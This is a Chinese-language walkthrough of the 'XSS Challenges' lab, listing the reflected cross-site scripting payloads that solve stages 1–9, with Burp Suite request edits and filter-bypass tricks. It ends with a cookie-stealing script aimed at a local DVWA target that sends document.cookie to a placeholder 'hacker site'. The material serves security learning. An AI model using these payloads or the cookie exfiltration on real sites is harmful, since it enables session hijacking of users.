# XSS Challenges

## Stage #1

第一种直接在**<b>**标签中可以执行的js代码

**`<script>alert(document.domain);</script>`**

第二种尝试闭合**<b>**标签，在标签外面实现js代码的执行

1）有引号：**`"</b><script>alert(document.domain);</script>`**

2）无引号：**`</b><script>alert(document.domain);</script>`**


## Stage #2

第一种将**<input>**标签闭合，在标签外面执行js代码

**`"><script>alert(document.domain);</script>`**

第二种就是构造事件，当事件触发的时候就执行代码

1）有引号：**`" onmouseover="alert(document.domain)">`**

2）无引号：**`" onmouseover=alert(document.domain)>`**


## Stage #3

需要使用**<u>burpsuite</u>**抓包进行修改，然后再发送给服务器。

将捕获到的数据包最后一行修改为：

1）闭合标签：p1=tokyo&p2=Japan**`</b><script>alert(document.domain);</script>`**

2）直接执行：p1=tokyo&p2=Japan**`<script>alert(document.domain);</script>`**


## Stage #4

同样需要使用**<u>burpsuite</u>**抓包进行修改，然后再发送给服务器。

将捕获到的数据包最后一行修改为：

p1=tokyo&p2=Japan&p3=hackme**`"><script>alert(document.domain);</script>`**

因为需要将**<input>**标签闭合，同时该标签是隐藏式的，所以不能使用事件。


## Stage #5

检查元素，发现文本框输入的长度被限制为**15**，需要将长度修改，浏览器直接修改为**1500**

改前：**<input type="text" name="p1" maxlength="15" size="30" value="1">**

改后：**<input type="text" name="p1" maxlength="1500" size="30" value="1">**

payload:

第一种将**<input>**标签闭合，在标签外面执行js代码

**`"><script>alert(document.domain);</script>`**

第二种就是构造事件，当事件触发的时候就执行代码

1）有引号：**`" onmouseover="alert(document.domain)">`**

2）无引号：**`" onmouseover=alert(document.domain)>`**


## Stage #6

并不能使用闭合的方式，只能构造事件

payload:

**`" onmouseover="alert(document.domain)">`**

**`" onmouseover="alert(document.domain)`**


## Stage #7

并不能使用闭合的方式，只能构造事件

payload:

**`" onmouseover=alert(document.domain)`**


## Stage #8

这里将输入的数据，转换成链接即**<a>**标签，点击链接后跳转

payload:

**`javascript:alert(document.domain)`**


## Stage #9



手工方面基本方法如下：
1.普通**< script>**文本闭合
2.构造HTML事件闭合
3.**< a>**标签里定义超链接闭合
4.**CSS**特性闭合（IE低版本）
5.**Burpsuite**改包
6.各种过滤

过滤引号（取消引号）
过滤字符（双写绕过，大小写绕过，插入不可见字符、空格等等）
过滤<>（对<>编码绕过，十六进制或URL编码等等）



对于XSS漏洞的理解。

就是查看站点能否插入并执行js代码（核心思想）

首先目标站点存在XSS的漏洞，用户登录到目标站点后，访问一个包含恶意代码的链接，该链接返回携带的恶意代码，浏览器进行解析。在解析恶意代码的时候，就可以获取当前目标站点页面的cookie，并且发生页面跳转。

document.cookie只能获取当前目标站点的cookie,并不是浏览器所有的cookie。

目标站点存在xss漏洞，然后在当前站点的基础之上，运行了恶意代码。（之前以为恶意链接是随意的一个地址，后来发现获取cookie。doucument.cookie必须在当前站点之中才有效果，所以在当前站点的基础之上，在执行恶意代码）

例如：

http://192.168.0.4/dvwa/vulnerabilities/xss_r/ 该站点存在xss(反射性)。

我们构造的恶意链接也必

http://192.168.0.4/dvwa/vulnerabilities/xss_r/ ?name=<script>document.location='黑客站点?cookie='+document.cookie</script>

